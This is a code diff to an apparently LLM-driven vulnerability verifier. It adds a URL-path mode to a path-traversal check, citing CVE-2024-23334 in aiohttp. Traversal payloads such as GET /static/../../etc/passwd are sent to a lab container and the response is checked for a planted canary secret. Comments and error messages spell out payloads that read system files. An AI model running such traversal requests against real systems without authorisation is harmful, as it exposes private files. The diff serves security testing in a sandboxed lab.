@@ -660,12 +660,28 @@ def verify_generic_path_traversal(
         return res
 
     path_param = path_param_hint or _pick_param(parameters, _PATH_HINTS)
-    if not path_param:
-        res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
-        res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
-                               "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
-                               "mano (path_param_hint)")
-        return res
+    # Gap real (confirmado con CVE-2024-23334 / aiohttp): muchos path-traversal inyectan el
+    # payload en el PATH de la URL, no en un query-param -- e.g. GET /static/../../etc/passwd.
+    # El LLM puede indicarlo con path_param_hint="URL_PATH" (o pasando "url_path" como parametro).
+    # Cuando el modo es URL_PATH el payload se concatena al endpoint en vez de enviarse como ?k=v.
+    _url_path_mode = (path_param or "").upper() in ("URL_PATH", "URLPATH") or (
+        isinstance(parameters, dict) and any(k.upper() in ("URL_PATH", "URLPATH") for k in parameters)
+    ) or (
+        isinstance(parameters, (list, tuple)) and any(
+            str(p).upper() in ("URL_PATH", "URLPATH") for p in parameters)
+    )
+    if not path_param and not _url_path_mode:
+        # ultimo intento: si el endpoint ya termina en '/' es probable que espere el path a
+        # continuacion (p.ej. /static/ -> /static/../../../../etc/passwd) -- modo URL_PATH.
+        if endpoint.endswith("/"):
+            _url_path_mode = True
+        else:
+            res.detail = "no se identifico el parametro que lleva la ruta/fichero objetivo"
+            res.limitations.append("la verificacion de path-traversal necesita saber que parametro "
+                                   "lleva la ruta/nombre de fichero; afina 'parameters' o pasalo a "
+                                   "mano (path_param_hint) o usa path_param_hint='URL_PATH' si el "
+                                   "payload va en el path de la URL (e.g. GET /files/../../etc/passwd)")
+            return res
 
     boot = _bootstrap_generic_lab(source_dir, step, res, budget_s, setup_commands=setup_commands)
     if boot is None:
@@ -699,19 +715,23 @@ def verify_generic_path_traversal(
         found = False
         tried = []
         for payload_value in attempts:
-            payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
-            payload[path_param] = payload_value
             try:
-                resp = _http_request(m, base_url + endpoint, timeout=15,
-                                        data=payload if m != "GET" else None,
-                                        params=payload if m == "GET" else None)
+                if _url_path_mode:
+                    # el payload va concatenado al path de la URL (CVE-2024-23334 / aiohttp etc.)
+                    target_url = base_url + endpoint + payload_value
+                    resp = _http_request(m, target_url, timeout=15)
+                    payload_desc = f"URL_PATH={payload_value!r}"
+                else:
+                    payload = dict(parameters) if isinstance(parameters, dict) else dict.fromkeys(parameters or [], "")
+                    payload[path_param] = payload_value
+                    resp = _http_request(m, base_url + endpoint, timeout=15,
+                                            data=payload if m != "GET" else None,
+                                            params=payload if m == "GET" else None)
+                    payload_desc = f"{path_param}={payload_value!r}"
             except Exception as e:
                 tried.append({"payload": payload_value, "error": str(e)})
                 continue
             present = secret in (resp.text or "")
-            # recorte real del cuerpo en CADA intento (no solo si/no esta el secreto) -- mismo
-            # motivo que en verify_wordpress_path_traversal: sin esto, un negativo es
-            # indiagnosticable sin relanzar el ataque a mano.
             tried.append({"payload": payload_value, "status": resp.status_code,
                          "secreto_presente": present,
                          "respuesta_cuerpo_recorte": (resp.text or "")[:300]})
@@ -721,16 +741,18 @@ def verify_generic_path_traversal(
                 res.evidence["status_code_respuesta"] = resp.status_code
                 res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                 step(f"VERIFICADO: el secreto plantado aparecio literal en la respuesta con "
-                     f"{path_param}={payload_value!r}.")
+                     f"{payload_desc}.")
                 break
 
         res.evidence["intentos"] = tried
         if found:
             res.verified = True
             res.ok = True
-            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {path_param}="
-                          f"{res.evidence['payload_ganador']!r} devolvio el secreto exacto "
-                          f"plantado en {canary_path} (dentro del contenedor del objetivo)")
+            winner = res.evidence["payload_ganador"]
+            mode_desc = f"URL_PATH={winner!r}" if _url_path_mode else f"{path_param}={winner!r}"
+            res.detail = (f"PATH TRAVERSAL confirmado: la peticion con {mode_desc} devolvio "
+                          f"el secreto exacto plantado en {canary_path} (dentro del contenedor "
+                          f"del objetivo)")
         else:
             res.ok = True
             sample = next((t.get("respuesta_cuerpo_recorte") for t in tried
